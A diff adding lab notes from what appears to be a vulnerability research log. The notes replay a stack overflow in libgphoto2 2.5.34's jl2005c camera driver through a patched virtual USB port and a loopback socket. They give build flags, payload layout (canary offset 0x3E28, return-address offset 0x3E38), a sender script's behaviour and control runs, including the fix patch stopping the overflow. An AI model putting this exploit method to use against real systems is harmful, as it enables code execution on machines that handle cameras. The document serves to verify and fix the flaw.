@@ -1,0 +1,71 @@
+# W169 (2026-11-24): clean-archive replay of W167, then a loopback-socket
+# variant where the oversized JL2005 allocation-table reply crosses a real
+# 127.0.0.1 TCP connection before reaching the real libgphoto2 2.5.34 camlib.
+#
+# HONEST SCOPE: still a lab-patched vusb port and a synthetic virtual device.
+# No USB/IP, physical bus, camera hardware, gvfs/digiKam consumer or remote
+# host. The target driver prints its own TLS canary and marker address; the
+# lab sender reads those from that local diagnostic output and puts them in
+# the socket payload. This is NOT a device-only canary-recovery path.
+# The in-process marker writes a line and _exit(0)s; it is not a command.
+# Rung 5 stays UNKNOWN. Nothing here changes the witness-pending W167 grade.
+
+## Clean-archive W167 replay (git archive 12056b0 -> /tmp/w169-lgp)
+PINS: 4/4 OK from /tmp/w169-lgp with lab/frontier/libgphoto2shell/PINS.sha256.
+tarball sha256 5df9e774eb4ab6087a193afff84dcafe9f666e3443fe29e73e6779f659ff7f28.
+Applied live/vusb-jl2005.patch then evidence/replay-vusb-local-modes.patch;
+camlibs/jl2005c/jl2005c.c sha256 0ccb1dac24a837bc58a414942cc74bec47586b826c6c0c91ddcec3adea3d6185.
+Configure: CFLAGS='-O0 -g -fPIC -fno-omit-frame-pointer' ./configure
+  --prefix=$PWD/installdir-plain --with-camlibs=jl2005c --enable-shared
+  --disable-static --without-libxml-2.0 --without-libcurl --without-gdlib
+  --without-libtiff-4 --without-libexif --disable-nls --enable-vusb
+Driver: gcc -O0 -g -fno-omit-frame-pointer -I$P/include -o two_stage_probe
+  ../../evidence/replay-two_stage_probe.c -L$P/lib -lgphoto2 -lgphoto2_port
+  -Wl,-rpath,$P/lib
+Run env (all runs below): CAMLIBS=$P/lib/libgphoto2/2.5.34
+  IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
+  LD_LIBRARY_PATH=$P/lib, port usb:001,001.
+
+M2SHELL_JL2005_VUSB=c M2SHELL_JL2005_COUNT=1022:
+  canary=0xbb61b7b26fea2a00 marker=0x0000632349e7e3c4
+  M2SHELL_IP_CONTROL_MARKER
+  RC=0
+Controls: count=100 rc=0 no marker; wrong canary rc=134 "stack smashing
+detected"; RIP=0x5a5a5a5a5a5a5a5a rc=139; mode 1 all-0x5a rc=134;
+pins/fix-6a3393d.patch applied and camlib rebuilt: "gp_camera_init rc=0",
+no marker, rc=0; patch reversed and camlib rebuilt: marker returns, RC=0.
+
+## Socket-backed bulk reply
+Local-only patch `evidence/replay-vusb-socket.patch` applies on top of the
+committed vusb patch and replay-vusb-local-modes.patch. Mode 'k' keeps the
+1-byte and 0x200-byte handshake replies local and routes every other read
+(the 0x4000-byte oversized table read at pinned :152) through
+connect(127.0.0.1, M2SHELL_JL2005_PORT) and recv() into the camlib buffer.
+`evidence/replay-socket_sender.py LOG PORT [CANARY_OVERRIDE] [RIP_OVERRIDE]`
+reads the target's printed canary/marker from LOG, sends 0x4000 bytes of
+0x5a with canary little-endian at 0x3E28 and chosen RIP at 0x3E38.
+
+Attack (port 18431), sender first, then target:
+  socket_sender addr=127.0.0.1:37862 bytes=16384 canary=0x8a47cb1378490700 rip=0x000062582bd1c3c4
+  target stderr: canary=... marker=..., VUSB_READ size=16384,
+                 VUSB_SOCKET got=16384 size=16384
+  target stdout: M2SHELL_IP_CONTROL_MARKER
+  RC=0
+The 16384 bytes that overflow the stack frame were received from the socket;
+the handshake bytes (16 x 1 and one 512) stayed local.
+
+Controls, same tree and env unless noted:
+  count=100 (port 18432): VUSB_SOCKET got=1536 size=1536,
+                          "gp_camera_init rc=0", no marker, rc=0.
+  canary=0xdeadbeef over wire (port 18433): got=16384,
+                          "*** stack smashing detected ***", no marker, rc=134.
+  RIP=0x5a5a5a5a5a5a5a5a over wire, correct canary (port 18435): got=16384,
+                          no marker, rc=139.
+  fixed camlib (pins/fix-6a3393d.patch, rebuilt, port 18437): only the
+                          1-byte and 512-byte handshake reads, no bulk read,
+                          "gp_camera_init rc=0", no marker, rc=0.
+  fix reversed and camlib rebuilt (port 18439): got=16384,
+                          "M2SHELL_IP_CONTROL_MARKER", RC=0.
+
+Raw per-run logs: /tmp/w169-lgp/{target,safe,wrongcanary,rip5a2,fixed3,restore3}
+{,.log,.out,.snd} (throwaway replay tree, not preserved in Git).
